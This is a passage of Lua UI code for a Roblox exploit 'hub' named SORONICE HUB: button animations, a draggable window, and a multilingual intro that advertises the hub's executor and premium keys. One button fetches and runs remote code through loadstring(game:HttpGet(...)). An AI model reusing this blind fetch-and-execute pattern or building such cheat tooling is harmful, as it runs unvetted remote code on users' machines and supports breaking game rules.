	local pressInfo = TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local bounceInfo = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out) -- C'est lui qui fait l'effet coussin !
	
	-- Fonction pour jouer l'animation facilement
	local function playTween(targetScale, tweenInfo)
		local tween = TweenService:Create(uiScale, tweenInfo, {Scale = targetScale})
		tween:Play()
	end
	
	-- 3. Le curseur ou le doigt ARRIVE sur le bouton (il grossit)
	button.MouseEnter:Connect(function()
		playTween(1.05, hoverInfo) -- Il passe à 105% de sa taille
	end)
	
	-- 4. Le curseur ou le doigt QUITTE le bouton (il rétrécit)
	button.MouseLeave:Connect(function()
		playTween(1, hoverInfo) -- Il revient à sa taille normale (100%)
	end)
	
	-- 5. On APPUIE sur le bouton (il s'écrase)
	button.MouseButton1Down:Connect(function()
		playTween(0.90, pressInfo) -- Il s'écrase à 90% de sa taille
	end)
	
	-- 6. On RELÂCHE le bouton (le grand rebond !)
	button.MouseButton1Up:Connect(function()
		playTween(1.05, bounceInfo) -- Il rebondit vers la taille agrandie (vu que le curseur est encore dessus)
	end)
	
end
coroutine.wrap(XXCYZ_fake_script)()

local function ZRUBY_fake_script() -- Bouton YouTube.LocalScript
	local script = Instance.new('LocalScript', _i[64])
	script.Name = [[LocalScript]]

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		-- Texte à copier
		local success, err = pcall(function()
			getgenv().Titre = "SORONICE HUB"
			getgenv().Message = "You copied the Youtube link"
			getgenv().Temps = 3
			getgenv().LD = 3 -- Active le dégradé animé !
	
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Audinay/GUI-MESSAGES/refs/heads/main/.lua"))()
		end)
		if not success then
			
		end
	end)
	
end
coroutine.wrap(ZRUBY_fake_script)()

local function ABMEM_fake_script() -- Bouton de déplacement.LocalScript
	local script = Instance.new('LocalScript', _i[66])
	script.Name = [[LocalScript]]

	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService") -- Requis pour la fluidité
	
	local boutonDrag = script.Parent
	local guiABouger = boutonDrag.Parent
	
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	-- Nouvelle variable : la position vers laquelle la fenêtre DOIT aller
	local targetPosition = guiABouger.Position 
	
	-- RÉGLAGE DU STYLE : Plus le chiffre est proche de 0, plus ça "glisse" avec du retard. (ex: 0.1)
	-- Plus le chiffre est proche de 1, plus c'est instantané.
	local vitesseFluidite = 0.30 
	
	-- Fonction qui calcule la destination (mais ne bouge pas encore la fenêtre)
	local function update(input)
		local delta = input.Position - dragStart
	
		-- On met à jour la CIBLE, pas la position réelle
		targetPosition = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X, 
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end
	
	-- Quand on clique ou qu'on pose le doigt
	boutonDrag.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = guiABouger.Position
			targetPosition = guiABouger.Position -- On synchronise au départ
	
			-- Quand on lâche
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Quand on bouge la souris/le doigt PENDANT le clic
	boutonDrag.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	-- Met à jour la cible quand on bouge
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	-- LA MAGIE EST ICI : À chaque image (frame), la fenêtre se rapproche de la cible
	RunService.RenderStepped:Connect(function()
		-- Le Lerp crée ce mouvement élastique/fluide
		guiABouger.Position = guiABouger.Position:Lerp(targetPosition, vitesseFluidite)
	end)
end
coroutine.wrap(ABMEM_fake_script)()

local function FXXJC_fake_script() -- TextLabel.LocalScript
	local script = Instance.new('LocalScript', _i[68])
	script.Name = [[LocalScript]]

	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	
	local LocalPlayer = Players.LocalPlayer
	local TextLabel = script.Parent
	
	-- ==========================================
	-- 🧠 MÉMOIRE DU JOUEUR (Ne joue qu'une seule fois)
	-- ==========================================
	local saveFileName = "SoroniceIntro_" .. tostring(LocalPlayer.UserId) .. ".txt"
	
	local supporteSauvegarde = (isfile and writefile)
	if supporteSauvegarde then
		local dejaVu = false
		pcall(function()
			if isfile(saveFileName) then
				dejaVu = true
			end
		end)
	
		if dejaVu then
			-- CORRECTION : On ne détruit QUE le texte, pas le GUI
			TextLabel:Destroy()
			return -- Coupe le script
		end
	end
	
	local oldScale = TextLabel:FindFirstChildOfClass("UIScale")
	if oldScale then oldScale:Destroy() end
	
	-- ==========================================
	-- ⚙️ CONFIGURATION DU FONDU
	-- ==========================================
	local tempsFondu = 1.0   
	local tempsLecture = 4.0 
	
	-- ==========================================
	-- 🌍 TRADUCTIONS INTÉGRALES (NE PAS SUPPRIMER)
	-- ==========================================
	local traductions = {
		FR = {
			"Bienvenue sur notre Hub ! Nous vous accueillons à bras ouverts.",
			"Un bug, une question ou un bannissement ? Notre équipe Discord est là pour vous.",
			"Ici, c'est votre communauté : votez pour les futurs ajouts et évolutions.",
			"Nouveau avec les scripts ? Notre chaîne YouTube regorge de tutoriels détaillés.",
			"Développeurs, profitez de notre obfuscateur privé et de nos UI sur mesure.",
			"Passez au niveau supérieur avec nos accès Premium : finis les systèmes de clés quotidiens.",
			"Et restez à l'affût... notre propre exécuteur arrive très bientôt.",
			"Merci de votre confiance. L'expérience commence maintenant."
		},
		EN = {
			"Welcome to our Hub! We welcome you with open arms.",
			"Got a bug, a question, or a ban? Our Discord team is here to help.",
			"This is your community: vote on future features and updates.",
			"New to scripting? Our YouTube channel is full of detailed tutorials.",
			"Developers, take advantage of our private obfuscator and custom UIs.",
			"Level up with Premium access: say goodbye to daily key systems.",
			"Stay tuned... our very own executor is coming soon.",
			"Thank you for your trust. The experience begins now."
		},
		ES = {
			"¡Bienvenido a nuestro Hub! Te recibimos con los brazos abiertos.",
			"¿Un error, una pregunta o un baneo? Nuestro equipo de Discord está aquí para ayudarte.",
			"Esta es tu comunidad: vota por futuras funciones y actualizaciones.",
			"¿Nuevo en los scripts? Nuestro canal de YouTube está lleno de tutoriales detallados.",
			"Desarrolladores, ofuscador privado y UIs personalizadas disponibles.",
			"Sube de nivel con el acceso Premium: adiós a las claves diarias.",
			"Mantente atento... nuestro ejecutor llegará muy pronto.",
			"Gracias por tu confianza. La experiencia comienza ahora."
		}
	}
	
	-- Choisis la langue ici ("FR", "EN", ou "ES")
	local langueActuelle = "FR" 
	local messages = traductions[langueActuelle] or traductions["FR"]
	
	local tweenInfo = TweenInfo.new(tempsFondu, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
	local fadeOutTween = TweenService:Create(TextLabel, tweenInfo, {TextTransparency = 1, TextStrokeTransparency = 1})
	local fadeInTween = TweenService:Create(TextLabel, tweenInfo, {TextTransparency = 0, TextStrokeTransparency = 0})
	
	-- ==========================================
	-- 🎬 LANCEMENT DE LA SÉQUENCE
	-- ==========================================
	local function playSequence()
		TextLabel.TextTransparency = 1
		TextLabel.TextStrokeTransparency = 1
	
		for i, msg in ipairs(messages) do
			TextLabel.Text = msg
			fadeInTween:Play()
			fadeInTween.Completed:Wait()
	
			task.wait(tempsLecture)
	
			fadeOutTween:Play()
			fadeOutTween.Completed:Wait()
	
			task.wait(0.3)
		end
	
		-- Sauvegarde de la progression
		if supporteSauvegarde then
			pcall(function()
				writefile(saveFileName, "Le joueur a vu l'introduction.")
			end)
		end
	
		-- CORRECTION : Nettoyage final, on ne détruit QUE le texte
		TextLabel:Destroy()
	end
	
	-- Lancement en arrière-plan pour ne pas bloquer le reste de tes scripts
	task.spawn(playSequence)
end
coroutine.wrap(FXXJC_fake_script)()
